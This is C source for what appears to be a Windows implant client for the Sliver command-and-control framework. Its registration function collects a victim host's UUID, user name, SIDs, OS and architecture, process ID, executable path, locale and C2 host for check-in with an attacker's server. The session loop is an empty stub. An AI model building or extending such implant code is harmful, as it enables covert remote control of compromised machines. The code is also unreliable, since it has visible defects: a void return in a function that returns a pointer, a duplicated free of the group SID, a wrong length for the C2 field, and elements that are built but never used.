#include "pch.h"

PBYTE RegisterSliver
(
	_In_ PSLIVER_HTTP_CLIENT pSliverClient,
	_In_ PDWORD pcbOutput
)
{
	LPSTR lpUUID = NULL;
	LPSTR lpFullQualifiedName = NULL;
	LPSTR lpUserSid = NULL;
	LPSTR lpGroupSid = NULL;
	OSVERSIONINFOA OsVersion;
	SYSTEM_INFO SystemInfo;
	LPSTR lpVersion = NULL;
	LPSTR lpHostName = NULL;
	LPSTR lpArch = NULL;
	LPSTR lpModulePath = NULL;
	DWORD cbModulePath = MAX_PATH;
	DWORD dwReturnedLength = 0;
	DWORD dwLastError = 0;
	LPSTR lpLocaleName = NULL;
	PBYTE pResult = NULL;
	DWORD cbResult = 1;
	CHAR szOsName[] = "windows";

	PPBElement pVersionElement = NULL;
	PPBElement pArchElement = NULL;
	PPBElement pHostNameElement = NULL;
	PPBElement pPidElement = NULL;
	PPBElement pFileNameElement = NULL;
	PPBElement pActiveC2Element = NULL;
	PPBElement pLocaleElement = NULL;
	PPBElement pUserSidElement = NULL;
	PPBElement pGroupSidElement = NULL;
	PPBElement pUserNameElement = NULL;
	PPBElement pUUIDElement = NULL;
	PPBElement pClientNameElement = NULL;
	PPBElement pOSElement = NULL;
	PPBElement pReconnectIntervalElement = NULL;

	lpUUID = GetHostUUID();
	if (lpUUID == NULL) {
		goto CLEANUP;
	}

	lpFullQualifiedName = GetComputerUserName();
	if (lpFullQualifiedName == NULL) {
		goto CLEANUP;
	}

	lpUserSid = GetCurrentProcessUserSID();
	if (lpUserSid == NULL) {
		goto CLEANUP;
	}

	lpGroupSid = GetCurrentProcessGroupSID();
	if (lpGroupSid == NULL) {
		goto CLEANUP;
	}

	SecureZeroMemory(&OsVersion, sizeof(OsVersion));
	if (!GetVersionExA(&OsVersion)) {
		LogError(L"ConvertSidToStringSidA failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
		goto CLEANUP;
	}

	SecureZeroMemory(&SystemInfo, sizeof(SystemInfo));
	GetNativeSystemInfo(&SystemInfo);
	lpVersion = ALLOC(0x100);
	sprintf_s(lpVersion, 0x100, "%d build %d", OsVersion.dwMajorVersion, OsVersion.dwMinorVersion);
	if (SystemInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) {
		lstrcatA(lpVersion, " x86_64");
		lpArch = DuplicateStrA("amd64", 0);
	}
	else if (SystemInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL) {
		lstrcatA(lpVersion, " x86");
		lpArch = DuplicateStrA("386", 0);
	}
	else {
		lpArch = DuplicateStrA("(NULL)", 0);
	}


	lpHostName = GetHostName();
	lpModulePath = ALLOC(cbModulePath + 1);
	while (TRUE) {
		SecureZeroMemory(lpModulePath, cbModulePath + 1);
		dwReturnedLength = GetModuleFileNameA(NULL, lpModulePath, cbModulePath);
		dwLastError = GetLastError();
		if (dwLastError == ERROR_INSUFFICIENT_BUFFER) {
			cbModulePath *= 2;
			lpModulePath = REALLOC(lpModulePath, cbModulePath + 1);
		}

		break;
	}

	lpLocaleName = ALLOC(0x20);
	GetSystemDefaultLocaleName(lpLocaleName, 0x20);
	//cbResult += 
	//OsVersion.

	pClientNameElement = CreateBytesElement(DuplicateStrA(pSliverClient->szSliverName, 0), lstrlenA(pSliverClient->szSliverName), 1);
	pHostNameElement = CreateBytesElement(lpHostName, lstrlenA(lpHostName), 2);
	pUUIDElement = CreateBytesElement(lpUUID, lstrlenA(lpUUID), 3);
	pUserNameElement = CreateBytesElement(lpFullQualifiedName, lstrlenA(lpFullQualifiedName), 4);
	pUserSidElement = CreateBytesElement(lpUserSid, lstrlenA(lpUserSid), 5);
	pGroupSidElement = CreateBytesElement(lpGroupSid, lstrlenA(lpGroupSid), 6);
	pOSElement = CreateBytesElement(DuplicateStrA(szOsName, 0), lstrlenA(szOsName), 7);
	pArchElement = CreateBytesElement(lpArch, lstrlenA(lpArch), 8);
	pPidElement = CreateVarIntElement(GetCurrentProcessId(), 9);
	pFileNameElement = CreateBytesElement(lpModulePath, lstrlenA(lpModulePath), 10);
	pActiveC2Element = CreateBytesElement(DuplicateStrA(pSliverClient->lpHostName, 0), lstrlenA(lpModulePath), 11);
	pVersionElement = CreateBytesElement(lpVersion, lstrlenA(lpVersion), 12);
	pReconnectIntervalElement = CreateVarIntElement(pSliverClient->uReconnectInterval, 13);
	pLocaleElement = CreateBytesElement(lpLocaleName, lstrlenA(lpLocaleName), 18);

CLEANUP:
	if (lpUUID != NULL) {
		FREE(lpUUID);
	}

	if (lpFullQualifiedName != NULL) {
		FREE(lpFullQualifiedName);
	}

	if (lpUserSid != NULL) {
		FREE(lpUserSid);
	}

	if (lpGroupSid != NULL) {
		FREE(lpGroupSid);
	}

	if (lpGroupSid != NULL) {
		FREE(lpGroupSid);
	}

	return;
}

VOID SessionMainLoop
(
	_In_ PSLIVER_HTTP_CLIENT pSliverClient
)
{
	
}